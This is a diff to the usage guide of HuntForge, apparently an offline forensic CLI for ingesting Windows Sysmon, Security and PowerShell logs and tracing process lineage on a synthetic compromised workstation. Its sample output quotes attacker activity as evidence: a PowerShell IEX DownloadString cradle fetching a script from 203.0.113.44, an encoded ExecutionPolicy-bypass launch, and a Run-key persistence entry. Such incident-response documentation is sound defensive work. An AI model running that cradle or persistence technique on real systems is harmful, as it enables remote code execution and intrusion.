@@ -1,9 +1,129 @@
 # HuntForge Usage Guide
 
-Scenario-driven walkthroughs for HuntForge v0.1. All output below is
+Scenario-driven walkthroughs for HuntForge. All output below is
 genuine — produced by running the commands against synthetic evidence.
 
-## Scenario: a compromised workstation
+## Scenario (v0.2): from log export to process lineage
+
+You have a finance workstation (`WS-FIN-014`) and a hunch that
+something ran PowerShell this morning. In v0.1 you would replay a
+JSONL fixture; in v0.2 you ingest the real thing: Sysmon, Security
+and PowerShell operational logs exported to XML/JSON.
+
+### 1. Export the logs (on the Windows host)
+
+HuntForge does **not** parse binary `.evtx` files — export them first.
+The adapter detects binary EVTX by magic bytes and tells you exactly
+what to run:
+
+```console
+$ huntforge ingest ./evidence --case CASE-001
+# if evidence contains a raw .evtx:
+#   warnings (1):
+#     - Security.evtx: binary EVTX detected — export it to XML first:
+#       wevtutil qe "C:\path\to\Security.evtx" /lf:true /f:xml > Security.xml
+```
+
+On the Windows machine:
+
+```console
+C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Security.evtx" /lf:true /f:xml > Security.xml
+C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" /lf:true /f:xml > Sysmon.xml
+C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" /lf:true /f:xml > PowerShell.xml
+```
+
+JSON exports (`wevtutil qe /f:json`, or array/`{"Events": [...]}`/JSONL
+shapes) work too. Everything stays offline — no network calls, no
+subprocesses.
+
+### 2. Create a case and ingest
+
+```console
+$ huntforge case create CASE-001 --name "Compromised workstation"
+case 'CASE-001' created
+$ huntforge ingest ./evidence --case CASE-001
+registered 3 evidence file(s), parsed 16 event(s) [powershell: 4, security: 5, sysmon: 7]
+  #1 powershell_events.xml sha256=d2f1ff8aab11a161…
+  #2 security_events.xml sha256=6f7721d5227b1e06…
+  #3 sysmon_intrusion.xml sha256=a8c7da2f74ab43a3…
+```
+
+The source kind is auto-detected **by content** (XML root/channel,
+JSON fields, magic bytes) — never by file extension. Override it with
+`--source sysmon|security|powershell|evtx-xml`; skip parsing entirely
+with `--no-parse`. Unrecognized files are still registered as
+evidence; malformed records become warnings, never a crash, and
+ingest always exits 0.
+
+Each parsed event lands in the normalized model with full provenance
+(source file, record index, parser name/version, ingest time, source
+SHA-256) and the 7-fractional-digit Windows timestamps are preserved
+exactly in `timestamp_original`.
+
+### 3. Hunt: process lineage
+
+```console
+$ huntforge events --case CASE-001 --process powershell.exe
+4 event(s) match
+[8] 2026-10-02T09:12:41Z evtx:Security:4688 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
+      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
+      flags: encoded-command (parser observation)
+[13] 2026-10-02T09:12:41Z sysmon:1 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
+      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
+      flags: encoded-command (parser observation)
+[14] 2026-10-02T09:13:02Z sysmon:3 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
+      dst_ip: 203.0.113.44
+[15] 2026-10-02T09:13:20Z sysmon:11 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
+      file_path: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
+```
+
+Two sources agree on the launch: the Security log's 4688 (hex PIDs
+decoded — `0x1cfe` → 7422) and Sysmon's EventID 1 (parent
+`WINWORD.EXE`, pid 3131, full hashes). The `encoded-command` flag is a
+**parser observation, not a verdict** — it records that `-enc`
+appeared on the command line. Detections arrive in v0.5; until then
+the judgment is yours.
+
+Then the rest of the chain — persistence and the script that ran:
+
+```console
+$ huntforge events --case CASE-001 --event-id 13
+[16] 2026-10-02T09:14:55Z sysmon:13 svchost.exe(8110)
+      registry_key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+$ huntforge events --case CASE-001 --event-id 4104
+1 event(s) match
+[1] 2026-10-02T09:12:41Z powershell:4104 host=WS-FIN-014 user=S-1-5-21-1111111111-2222222222-3333333333-1001 process=-(-)
+      command_line: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage1.ps1')
+```
+
+Script-block text is captured from 4104 records; large blocks span
+several 4104 records sharing one `ScriptBlockId`, noted in `raw` so
+you can reassemble them.
+
+![HuntForge v0.2 telemetry ingest](images/02-ingest.png)
+
+### 4. Automation and audit
+
+Every command accepts `--json` for the stable result envelope; the
+ingest summary now includes `parsed_events`, `parsed_by_source` and
+`parse_warnings`. Filters combine with AND:
+
+```console
+$ huntforge events --case CASE-001 --host WS-FIN-014 --user m.alvarez --json
+$ huntforge audit --case CASE-001   # every invocation is logged
+```
+
+Exit codes: `0` success (including "no events match" and
+parse warnings), `2` usage/operational error.
+
+## What's next
+
+v0.3 adds prefetch/registry/task parsers; v0.4 builds timeline and
+process lineage on top of the events ingested here.
+
+---
+
+## Scenario (v0.1): a compromised workstation
 
 You have two exported event logs from a finance workstation
 (`Security.evtx`, `Sysmon.evtx`) and a hunch that something ran
